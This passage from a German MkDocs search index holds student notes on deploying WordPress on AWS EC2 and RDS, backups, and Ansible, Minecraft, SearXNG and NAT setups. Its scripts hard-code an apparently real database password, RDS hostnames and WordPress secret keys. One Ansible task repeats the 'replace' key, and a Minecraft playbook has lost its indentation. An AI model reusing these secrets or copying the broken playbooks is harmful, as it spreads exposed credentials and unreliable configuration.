Erkennung der Sicherheitsgruppe. Konfiguriere dann 2 Sicherheitsgruppenregel: 1. Um mit SSH auf die VM zu kommen (Am besten der Quelltyp \u00abMeine IP\u00bb, man kann aber nat\u00fcrlich auch \u00ab\u00dcberall\u00bb benutzen) 2. Die zweite w\u00e4re das http Traffic von \u00fcberall auf die Sp\u00e4tere Wordpressseite Zugriff hat.</p> <p></p> <p></p> <p>Am Schluss sollten die Konfigurationen ungef\u00e4hr so angezeigt werden. Danach kann man auf \u201eInstance starten\u201c dr\u00fccken.</p> <p></p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#konfiguration-ihrer-rds-datenbank","title":"Konfiguration ihrer RDS-Datenbank","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#datenbank-sicherheitsgruppe-anpassen","title":"Datenbank Sicherheitsgruppe anpassen","text":"<p>Um die Sicherheitsgruppe der Datenbank so anzupassen das nur die EC2-Instanz eine Verbindung aufbauen kann muss man auf die Datenbank gehen und dann nach VPC-Sicherheitsgruppen suchen. Wenn man diese gefunden hat, dr\u00fcckt man auf diese drauf und f\u00fcgt eine neue Regel f\u00fcr den eingehenden Datenverkehr hinzu</p> <p></p> <p></p> <p>Diese Regel sollte ungef\u00e4hr so aussehen wie die auf der linken Seite.</p> <p></p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#per-ssh-auf-ec2-instanz-verbinden","title":"Per SSH auf EC2 Instanz Verbinden","text":"<p>Wie man sich mit der EC2 Instanz verbindet, kann man auf der linken Seite erkennen.</p> <p></p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#mysql-installieren-auf-datenbank-verbinden-und-user-erstellen","title":"MySQL installieren, auf Datenbank verbinden und User erstellen","text":"<pre><code>sudo yum update sudo yum install -y mysql\n</code></pre> <p>Nachdem man das Repository geupdatet und MySQL installiert hat kann man sich auf die Datenbank verbinden, um den Wordpress MySQL User zu erstellen. Daf\u00fcr muss man die Endpunkt Adresse herausfinden die man in der AWS-Konsole unter RDS/Databases/\u201cWordPress Datenbank\u201c findet.</p> <p></p> <p></p> <p>Um die Endpunkt Adresse hinzuzuf\u00fcgen, benutzt man den Befehl:  export MYSQL_HOST= <p></p> <p>Mit diesen Befehlen verbindet man sich auf die Datenbank und erstellt einen Benutzer mit dem Namen \u201ewordpress\u201c der \u201eALL PRIVILEGES\u201c hat.</p> <p></p> <p></p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#konfigurieren-von-wordpress-auf-ec2","title":"Konfigurieren von WordPress auf EC2","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#webservice-installieren","title":"Webservice Installieren","text":"<p>Hier installiert man den Webserver von Apache.</p> <pre><code>sudo yum install -y httpd\nsudo service httpd start\n</code></pre> <p></p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#wordpress-herunterladen-und-installieren","title":"WordPress herunterladen und Installieren","text":"<p>Man l\u00e4dt das neuste WordPress .tar.gz herunter und entpackt es.</p> <pre><code>wget https://wordpress.org/latest.tar.gz\ntar -xzf latest.tar.gz\n</code></pre> <p></p> <p>Nachher geht man in das Directory wordpress und kopiert die Sample config zur wirklichen WordPress config.</p> <pre><code>cd wordpress\ncp wp-config-sample.php wp-config.php\n</code></pre> <p>In dem wp-config.php File \u00e4ndert man die Database Settings zu den eigenen</p> <p></p> <p>Hier f\u00fcgt man noch die API secret-keys ein damit man sicherer ist. Diese k\u00f6nnen in diesem Link generiert werden.</p> <p></p> <pre><code>sudo amazon-linux-extras install -y lamp-mariadb10.2-php7.2 php7.2\ncd /home/ec2-user\nsudo cp -r wordpress/* /var/www/html/\nsudo service httpd restart\n</code></pre> <p>Und wenn man die letzten Konfigurationen, die man oben sieht, ausf\u00fchrt. Sollte am Schluss im Browser die WordPress Seite zu sehen sein.</p> <p></p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#backup","title":"Backup","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#amazon-ec2-backup-and-restore-using-aws-backup","title":"Amazon EC2 Backup and Restore using AWS Backup","text":"<p>Gehe auf den AWS Backup Service und erstelle einen On-Demand-Backup.</p> <p></p> <p>Auf den Ressourcentyp w\u00e4hlt man entweder EC2 und RDS und dann die Instance-ID des RDS (WordPress) und EC2 (WordPress). Die Aufbewahrungszeitraum soll 7 Tage betragen und der Backup-Tresor ist WordPress (kann auch Default sein). Leider geht diese Methode nicht da wir nicht die n\u00f6tigen Berechtigungen haben.</p> <p></p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#ec2-snapshot","title":"EC2 Snapshot","text":"<p>Hier sind die Schritte, um ein Snapshot-Image von einer EC2-Instanz zu erstellen:</p> <ol> <li>\u00d6ffnen Sie das AWS Management Console und melden Sie sich mit Ihrem AWS-Konto an.</li> <li>Navigieren Sie zum Bereich \"EC2\" und w\u00e4hlen Sie die Instanz aus, von der Sie ein Snapshot-Image erstellen m\u00f6chten.</li> <li> <p>Klicken Sie auf die Schaltfl\u00e4che \"Action\" und w\u00e4hlen Sie \"Image\" &gt; \"Create Image\" aus.</p> <p></p> </li> <li> <p>Geben Sie im Dialogfeld \"Create Image\" einen Namen und eine Beschreibung f\u00fcr das Snapshot-Image ein.</p> </li> <li>W\u00e4hlen Sie \"No Reboot\" aus, wenn Sie m\u00f6chten, dass die Instanz w\u00e4hrend des Erstellens des Snapshot-Images l\u00e4uft. W\u00e4hlen Sie \"Reboot\" aus, wenn Sie m\u00f6chten, dass die Instanz neu gestartet wird, bevor das Snapshot-Image erstellt wird.</li> <li> <p>Klicken Sie auf die Schaltfl\u00e4che \"Create Image\".</p> <p></p> </li> <li> <p>Das Snapshot-Image wird im Hintergrund erstellt und kann in der Liste der AMIs (Amazon Machine Images) im AWS Management Console angezeigt werden, wenn es abgeschlossen ist.     </p> </li> </ol> <p>Es ist wichtig zu beachten, dass das Snapshot-Image nur die Inhalte der EBS-Volumes sichert, die an die EC2-Instanz angef\u00fcgt sind. Wenn Sie andere Daten auf der Instanz haben, die nicht in einem EBS-Volume gespeichert sind, m\u00fcssen Sie diese Daten separat sichern. Sie k\u00f6nnen zum Beispiel ein Backup von der EC2-Instanz auf S3 speichern, um zus\u00e4tzliche Sicherheit zu gew\u00e4hrleisten.</p> <p>Von Snapshot Volume Wiederherstellen:</p> <p></p> <p></p> <p></p> <p></p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#rds-backup","title":"RDS Backup","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#rds-backup-automatisch","title":"RDS Backup Automatisch","text":"<p>Um die automatischen Backups f\u00fcr Ihre RDS-Instanz zu nutzen, m\u00fcssen Sie diese zun\u00e4chst einrichten. Hier sind die Schritte, wie Sie das tun k\u00f6nnen:</p> <ol> <li> <p>\u00d6ffnen Sie die Amazon RDS-Konsole und w\u00e4hlen Sie die Instanz aus, f\u00fcr die Sie Backups einrichten m\u00f6chten.     </p> </li> <li> <p>Klicken Sie auf die Registerkarte \"Backups\" und dann auf \"Edit Backup Retention Period\".</p> </li> <li>Geben Sie die Anzahl der Tage an, f\u00fcr die Sie Backups aufbewahren m\u00f6chten, und klicken Sie dann auf \"Save Changes\". Standardm\u00e4\u00dfig werden Backups f\u00fcr eine Retention-Zeit von einem Tag erstellt.     </li> </ol> <p>Wichtig: Wenn Sie die Retention-Zeit auf 0 Tage \u00e4ndern, werden automatische Backups deaktiviert. Sobald die automatischen Backups eingerichtet sind, werden t\u00e4glich Backups Ihrer RDS-Instanz erstellt und f\u00fcr die angegebene Anzahl von Tagen aufbewahrt. Sie k\u00f6nnen diese Backups in der RDS-Konsole unter der Registerkarte \"Backups\" anzeigen und verwalten.</p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#rds-backup-manuell","title":"RDS Backup Manuell","text":"<p>Um manuelle Snapshots von Ihrer RDS-Instanz zu erstellen, folgen Sie diesen Schritten:</p> <ol> <li> <p>\u00d6ffnen Sie die Amazon RDS-Konsole und w\u00e4hlen Sie die Instanz aus, f\u00fcr die Sie einen Snapshot erstellen m\u00f6chten.     </p> </li> <li> <p>Klicken Sie auf die Registerkarte \"Snapshots\" und dann auf \"Create DB Snapshot\".      </p> </li> <li> <p>Geben Sie einen Namen f\u00fcr den Snapshot an und klicken Sie auf \"Create DB Snapshot\".</p> </li> </ol> <p>Der Snapshot-Prozess kann einige Zeit in Anspruch nehmen, abh\u00e4ngig von der Gr\u00f6\u00dfe Ihrer Datenbank. W\u00e4hrend des Prozesses wird Ihre RDS-Instanz m\u00f6glicherweise kurzzeitig nicht verf\u00fcgbar sein. Sobald der Snapshot erstellt wurde, wird er in der Liste der Snapshots angezeigt, die Sie in der RDS-Konsole unter der Registerkarte \"Snapshots\" finden. Sie k\u00f6nnen auf den Namen des Snapshots klicken, um weitere Informationen anzuzeigen und ihn zu verwalten. Hinweis: Manuell erstellte Snapshots bleiben solange erhalten, bis Sie sie manuell l\u00f6schen. Es ist daher wichtig, dass Sie regelm\u00e4\u00dfig \u00fcberfl\u00fcssige Snapshots l\u00f6schen, um Speicherplatz zu sparen.</p> <p>Von Backup Datenbank erstellen:</p> <p></p> <p></p> <p>Wenn man Wiederherstellen dr\u00fcckt kann man eine Neue DB erstellen mit den Informationen</p> <p></p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#was-bedeutet-stateless-architecture","title":"Was Bedeutet Stateless Architecture:","text":"<p>Eine stateless architecture bedeutet, dass keine Informationen \u00fcber den Zustand einer Anwendung auf dem Server gespeichert werden. Dies bedeutet, dass jeder Request, den ein Benutzer an die Anwendung sendet, alle notwendigen Informationen enth\u00e4lt, um die Anforderung zu verarbeiten. Der Server muss keine Informationen aus einem vorherigen Request speichern, um den aktuellen Request zu verarbeiten.</p> <p>Ein Beispiel f\u00fcr eine stateless architecture w\u00e4re eine Wordpress-Installation, bei der alle Benutzerinformationen in der Datenbank gespeichert werden und jeder Request, den ein Benutzer an die Anwendung sendet, die erforderlichen Informationen von der Datenbank abruft, um die Anforderung zu verarbeiten. Die Anwendung muss keine Informationen \u00fcber den Zustand des Benutzers auf dem Server speichern, um Anforderungen von diesem Benutzer zu verarbeiten.</p> <p></p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#bash-script","title":"Bash Script","text":"<p>Da mir diese Schritte aber zu lang gingen habe ich noch ein kurzes Bash Script geschrieben. (Zuunterst sieht man noch einen Link zum Test Video)</p> <p>wordpress.sh<pre><code>#!/bin/bash\nsudo yum -y update\nsudo yum install -y mysql\nsudo yum install -y httpd\nsudo service httpd start\nwget https://wordpress.org/latest.tar.gz\ntar -xzf latest.tar.gz\ncp wordpress/wp-config-sample.php wordpress/wp-config.php\n\n# Set the new values for the database variables\nnew_db_name='wordpress'\nnew_db_user='wordpress'\nnew_db_password='5ztDByGKq49aKm3S'\nnew_db_host='wordpressdb.csj4fgsm0wsp.us-east-1.rds.amazonaws.com'\n# Replace the old values in the wp-config.php file\nsed -i \"s/define( 'DB_NAME', 'database_name_here' );/define( 'DB_NAME', '$new_db_name' );/\" wordpress/wp-config.php\nsed -i \"s/define( 'DB_USER', 'username_here' );/define( 'DB_USER', '$new_db_user' );/\" wordpress/wp-config.php\nsed -i \"s/define( 'DB_PASSWORD', 'password_here' );/define( 'DB_PASSWORD', '$new_db_password' );/\" wordpress/wp-config.php\nsed -i \"s/define( 'DB_HOST', 'localhost' );/define( 'DB_HOST', '$new_db_host' );/\" wordpress/wp-config.php\n\n# Ersetze die Zeilen mit den 'unique phrase' durch die neuen Werte\nsed -i -s 's{define( '\\''AUTH_KEY'\\'',         '\\''put your unique phrase here'\\'' );{define('\\''AUTH_KEY'\\'',         '\\''0ozpHN_tE]U?[L.)kvnCDrC-H*qI:UgzQvV9Ga+)k+*~RlZZZHD,kB&gt;[&lt;Y6|RJXC'\\'' );{' wordpress/wp-config.php\nsed -i -s 's?define( '\\''SECURE_AUTH_KEY'\\'',  '\\''put your unique phrase here'\\'' );?define('\\''SECURE_AUTH_KEY'\\'',  '\\''{G!dia+f!={U&gt;8vI%Ch0Y-{/xO~Eew^q_ETOyG]~EUeK;C2v3JRx8)N [vi[tO}&lt;'\\'' );?' wordpress/wp-config.php\nsed -i -s 's}define( '\\''LOGGED_IN_KEY'\\'',    '\\''put your unique phrase here'\\'' );}define('\\''LOGGED_IN_KEY'\\'',    '\\''!*^I0Q?teip2%gg8W=ssNTeB,M?7/+++U7bJ`GHN9/-i#Y&lt;{n`hK5lNO[gOB~|#y'\\'' );}' wordpress/wp-config.php\nsed -i -s 's!define( '\\''NONCE_KEY'\\'',        '\\''put your unique phrase here'\\'' );!define('\\''NONCE_KEY'\\'',        '\\''W*L:-+4kkn4{hX_8TH`P3Z0yq1==vy)4M~OBRkJ*e}u:1ttc_}Kb8HmMV+|yO&gt;1 '\\'' );!' wordpress/wp-config.php\nsed -i -s 's}define( '\\''AUTH_SALT'\\'',        '\\''put your unique phrase here'\\'' );}define('\\''AUTH_SALT'\\'',        '\\''*vb,woc2_=4|[5$di(?Ata;{vQ6,!nf3OT.#( #&lt;poS7AdkX_BU1Px~~8nY!y[1x'\\'' );}' wordpress/wp-config.php\nsed -i -s 's{define( '\\''SECURE_AUTH_SALT'\\'', '\\''put your unique phrase here'\\'' );{define('\\''SECURE_AUTH_SALT'\\'', '\\''*o:&lt;yV#gpxt/cS#HrsHeX?[A*;hm+!`oufT}WZWBum1Bn:;0hM6jyNZScN&lt;tC)! '\\'' );{' wordpress/wp-config.php\nsed -i -s 's}define( '\\''LOGGED_IN_SALT'\\'',   '\\''put your unique phrase here'\\'' );}define('\\''LOGGED_IN_SALT'\\'',   '\\''DY+PZ8;3?*~/~GnaQk)T&lt;=47o|)x#Ht(o,^Zs3K,{*UtX2CBB[Ia;1Y!0:h]Q^#C'\\'' );}' wordpress/wp-config.php\nsed -i -s 's}define( '\\''NONCE_SALT'\\'',       '\\''put your unique phrase here'\\'' );}define('\\''NONCE_SALT'\\'',       '\\'',abD~m/;Ws0NJ]I]EodiE[{a,x|DU/W%w/aK15j Ee?]&gt; 7L-i$u[?C,5=qt&lt;q{8'\\'' );}' wordpress/wp-config.php\n\nsudo amazon-linux-extras install -y lamp-mariadb10.2-php7.2 php7.2\nsudo cp -r wordpress/* /var/www/html/\nsudo service httpd restart\n</code></pre> Video: https://youtu.be/b2QCiFxmGvw</p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#ansible-playbook","title":"Ansible Playbook","text":"<p>Da mir diese Schritte aber zu lang gingen habe ich noch ein kurzes Ansible Playbook geschrieben. (Zuunterst sieht man noch einen Link zum Test Video)</p> wordpress.yml<pre><code>---\n- name: Install and configure WordPress\n  hosts: all\n  become: true\n  vars:\n    new_db_name: wordpress\n    new_db_user: wordpress\n    new_db_password: 5ztDByGKq49aKm3S\n    new_db_host: wordpress02.csj4fgsm0wsp.us-east-1.rds.amazonaws.com\n\n  tasks:\n    - name: Update package manager cache and install MySQL, Apache, and PHP\n      package:\n        name:\n          - mysql\n          - httpd\n          - amazon-linux-extras\n        state: latest\n      register: pkg_result\n\n    - name: Start Apache service\n      service:\n        name: httpd\n        state: started\n\n    - name: Download latest WordPress tarball\n      get_url:\n        url: https://wordpress.org/latest.tar.gz\n        dest: /tmp/latest.tar.gz\n\n    - name: Extract WordPress tarball\n      unarchive:\n        src: /tmp/latest.tar.gz\n        dest: /tmp\n        remote_src: yes\n\n    - name: copy files task\n      shell: cp /tmp/wordpress/wp-config-sample.php /tmp/wordpress/wp-config.php\n\n    - name: Set database variables in wp-config.php\n      replace:\n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\(\\\\s*'DB_NAME',\\\\s*'.*'\\\\s*\\\\)\"\n        replace: \"define( 'DB_NAME', '{{ new_db_name }}' );\"\n\n    - name: Set database user in wp-config.php\n      replace:\n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\(\\\\s*'DB_USER',\\\\s*'.*'\\\\s*\\\\)\"\n        replace: \"define( 'DB_USER', '{{ new_db_user }}' );\"\n\n    - name: Set database password in wp-config.php\n      replace:\n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\(\\\\s*'DB_PASSWORD',\\\\s*'.*'\\\\s*\\\\)\"\n        replace: \"define( 'DB_PASSWORD', '{{ new_db_password }}' );\"\n\n    - name: Set database host in wp-config.php\n      replace:\n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\(\\\\s*'DB_HOST',\\\\s*'.*'\\\\s*\\\\)\"\n        replace: \"define( 'DB_HOST', '{{ new_db_host }}' );\"\n\n    - name: Set unique phrases in wp-config.php\n      replace: \n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\( 'AUTH_KEY',\\\\s+'put your unique phrase here' \\\\);\"\n        replace: \"define('AUTH_KEY', '0ozpHN_tE]U?[L.)kvnCDrC-H*qI:UgzQvV9Ga+)k+*~RlZZZHD,kB&gt;[&lt;Y6|RJXC');\"\n      replace: \n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\( 'SECURE_AUTH_KEY',\\\\s+'put your unique phrase here' \\\\);\"\n        replace: \"define('SECURE_AUTH_KEY', '{G!dia+f!={U&gt;8vI%Ch0Y-{/xO~Eew^q_ETOyG]~EUeK;C2v3JRx8)N [vi[tO}&lt;');\"\n      replace: \n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\( 'LOGGED_IN_KEY',\\\\s+'put your unique phrase here' \\\\);\"\n        replace: \"define('LOGGED_IN_KEY', '!*^I0Q?teip2%gg8W=ssNTeB,M?7/+++U7bJ`GHN9/-i#Y&lt;{n`hK5lNO[gOB~|#y');\"\n      replace: \n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\( 'NONCE_KEY',\\\\s+'put your unique phrase here' \\\\);\"\n        replace: \"define('NONCE_KEY', 'W*L:-+4kkn4{hX_8TH`P3Z0yq1==vy)4M~OBRkJ*e}u:1ttc_}Kb8HmMV+|yO&gt;1 ');\"\n      replace: \n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\( 'AUTH_SALT',\\\\s+'put your unique phrase here' \\\\);\"\n        replace: \"define('AUTH_SALT', '*vb,woc2_=4|[5$di(?Ata;{vQ6,!nf3OT.#( #&lt;poS7AdkX_BU1Px~~8nY!y[1x');\"\n      replace: \n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\( 'SECURE_AUTH_SALT',\\\\s+'put your unique phrase here' \\\\);\"\n        replace: \"define('SECURE_AUTH_SALT', '*o:&lt;yV#gpxt/cS#HrsHeX?[A*;hm+!`oufT}WZWBum1Bn:;0hM6jyNZScN&lt;tC)! ');\"\n      replace: \n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\( 'LOGGED_IN_SALT',\\\\s+'put your unique phrase here' \\\\);\"\n        replace: \"define('LOGGED_IN_SALT', 'DY+PZ8;3?*~/~GnaQk)T&lt;=47o|)x#Ht(o,^Zs3K,{*UtX2CBB[Ia;1Y!0:h]Q^#C');\"\n      replace: \n        path: /tmp/wordpress/wp-config.php\n        regexp: \"define\\\\( 'NONCE_SALT',\\\\s+'put your unique phrase here' \\\\);\"\n        replace: \"define('NONCE_SALT', 'abD~m/;Ws0NJ]I]EodiE[{a,x|DU/W%w/aK15j Ee?]&gt; 7L-i$u[?C,5=qt&lt;q{8');\"\n\n    - name: Install lamp-mariadb10.2-php7.2\n      command: \"sudo amazon-linux-extras install -y lamp-mariadb10.2-php7.2 php7.2\"\n\n    - name: copy files task\n      shell: sudo cp -r /tmp/wordpress/* /var/www/html/\n\n    - name: Restart Apache service\n      service:\n        name: httpd\n        state: restarted\n</code></pre> <p>Video: https://youtu.be/Nb9mF5vab7M</p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/","title":"Minecraft mit Ansible","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#auftrag","title":"Auftrag","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#ansible-installation-und-setup","title":"Ansible Installation und Setup","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#installation","title":"Installation","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#alte-ansible-version-entfernen","title":"Alte Ansible Version entfernen","text":"<pre><code>sudo apt remove ansible\nsudo apt --purge autoremove\n</code></pre>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#update-und-upgrade-rep","title":"Update und Upgrade Rep","text":"<pre><code>sudo apt update\nsudo apt upgrade\n</code></pre>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#personal-package-archives-auf-die-neuste-version-konfigurieren","title":"Personal Package Archives auf die neuste Version konfigurieren","text":"<pre><code>sudo apt -y install software-properties-common\nsudo apt-add-repository ppa:ansible/ansible\n</code></pre>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#installieren-von-ansible","title":"Installieren von Ansible","text":"<pre><code>sudo apt install ansible\n</code></pre> <p>Source: https://www.cyberciti.biz/faq/how-to-install-and-configure-latest-version-of-ansible-on-ubuntu-linux/</p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#ssh-keys-auf-ansible-system-kopieren","title":"SSH Keys auf Ansible System kopieren","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#inventory-file-erstellen","title":"Inventory File erstellen","text":"inventory<pre><code>[minecraft]\nprimary ansible_host=192.168.66.71 ansible_user=manuel\n</code></pre>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#inventory-konfiguration-testen","title":"Inventory Konfiguration testen","text":"<pre><code>ansible all -i inventory --list-hosts\n</code></pre> <pre><code>ansible all -i inventory \u2013m ping\n</code></pre>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#playbook","title":"Playbook","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#erstellen","title":"Erstellen","text":"playbook.yml<pre><code>---\n- hosts: all\ntasks:\n- name: Print message\ndebug:\nmsg: Hello Ansible World\n</code></pre>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#testen","title":"Testen","text":"<pre><code>ansible-playbook -i inventory playbook.yml\n</code></pre>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#minecraft-docker-ansible-skript","title":"Minecraft Docker Ansible Skript","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#erstellen_1","title":"Erstellen","text":"minecraft.yml<pre><code>---\n- hosts: all\nbecome: yes\ntasks:\n- name: Install docker\nansible.builtin.apt:\nname: docker.io\nupdate_cache: yes\n- name: Pull und run Minecraft Server\ncommunity.docker.docker_container:\nname: mcserver\nimage: itzg/minecraft-server\nrestart_policy: always\nports:\n- \"25565:25565\"\nenv:\nEULA: \"TRUE\"\nVERSION: \"1.18.2\"\n</code></pre>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#testen_1","title":"Testen","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#mit-ansible-auf-die-vm-installieren","title":"Mit Ansible auf die VM Installieren","text":"<pre><code>ansible-playbook -i inventory minecraft.yml\n</code></pre>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#auf-vm-kontrollieren-ob-docker-container-am-laufen-ist-kontrollieren-ob-container-automatisch-startet","title":"Auf VM kontrollieren ob Docker Container am laufen ist + Kontrollieren ob Container Automatisch startet.","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#auf-minecraft-server-verbinden","title":"Auf Minecraft Server verbinden.","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/minecraft-mit-ansible/#schwierigkeiten","title":"Schwierigkeiten","text":"<p>community.docker.docker_container hat zu anfangs nicht funktioniert da ich auf der Version 2.9.6 arbeitete (Per Teams Anleitung Installiert) und diese laut GitHub viele Bugs aufzuweisen hat. </p>"},{"location":"Privat/Searxng/","title":"Eigener Browser (Searxng)","text":""},{"location":"Privat/Searxng/#schritt-1-installation","title":"Schritt 1: Installation","text":"<pre><code>apt update &amp;&amp; apt upgrade -y\napt install docker.io docker-compose git -y\n</code></pre>"},{"location":"Privat/Searxng/#schritt-2-git-clonen-und-env-andern","title":"Schritt 2: Git clonen und .env \u00e4ndern","text":"<pre><code>cd /usr/local\ngit clone https://github.com/searxng/searxng-docker.git\ncd searxng-docker\nnano .env\n</code></pre> .env<pre><code># By default listen on https://localhost\n# To change this:\n# * uncomment SEARXNG_HOSTNAME, and replace &lt;host&gt; by the SearXNG hostname\n# * uncomment LETSENCRYPT_EMAIL, and replace &lt;email&gt; by your email (require to create a Let's Encrypt certificate)\nSEARXNG_HOSTNAME=example.com\nLETSENCRYPT_EMAIL=example@example.com\n</code></pre> <p>Searxng starten:</p> <pre><code>sed -i \"s|ultrasecretkey|$(openssl rand -hex 32)|g\" searxng/settings.yml\ncd /usr/local/searxng-docker\nsudo docker-compose up -d\n</code></pre>"},{"location":"Privat/nat-instanz/","title":"NAT-Instanz","text":""},{"location":"Privat/nat-instanz/#schritt-1-instanz-erstellen","title":"Schritt 1: Instanz Erstellen","text":"<p>Erstellen Sie eine neue Amazon Linux 2-Instanz</p> <p>Erstellen Sie eine neue EC2-Instanz in der AWS Management Console. W\u00e4hlen Sie als Betriebssystem \"Amazon Linux 2\". Stellen Sie sicher, dass die Instanz in der richtigen VPC und Subnetz ist.</p>"},{"location":"Privat/nat-instanz/#schritt-2-sicherheitsgruppen-konfigurieren","title":"Schritt 2: Sicherheitsgruppen konfigurieren","text":"<p>Erstellen Sie eine Sicherheitsgruppe f\u00fcr die NAT-Instanz. Diese sollte ausgehenden Datenverkehr f\u00fcr das private Subnetz erlauben und eingehenden Datenverkehr nur f\u00fcr dasjenige zulassen, was f\u00fcr die Administration erforderlich ist (z.B. SSH). Vergessen Sie nicht, die Sicherheitsgruppe f\u00fcr die NAT-Instanz in der EC2-Instanzkonfiguration auszuw\u00e4hlen.</p>"},{"location":"Privat/nat-instanz/#schritt-3-ip-weiterleitung","title":"Schritt 3: IP-Weiterleitung","text":"<p>Aktivieren Sie die IP-Weiterleitung</p> <p>Melden Sie sich \u00fcber SSH bei der EC2-Instanz an und f\u00fchren Sie den folgenden Befehl aus, um die IP-Weiterleitung zu aktivieren:</p> <pre><code>sudo sysctl -w net.ipv4.ip_forward=1\n</code></pre> <p>Um diese Einstellung dauerhaft zu machen, \u00f6ffnen Sie die Datei /etc/sysctl.conf mit einem Texteditor (z.B. vi oder nano) und f\u00fcgen Sie die folgende Zeile hinzu:</p> /etc/sysctl.conf<pre><code>net.ipv4.ip_forward = 1\n</code></pre>"},{"location":"Privat/nat-instanz/#schritt-4-sourcedest-check","title":"Schritt 4: Source/Dest Check","text":"<p>Konfigurieren Sie Source/Destination Check</p> <p>Gehen Sie zur EC2-Managementkonsole und w\u00e4hlen Sie die NAT-Instanz aus. Klicken 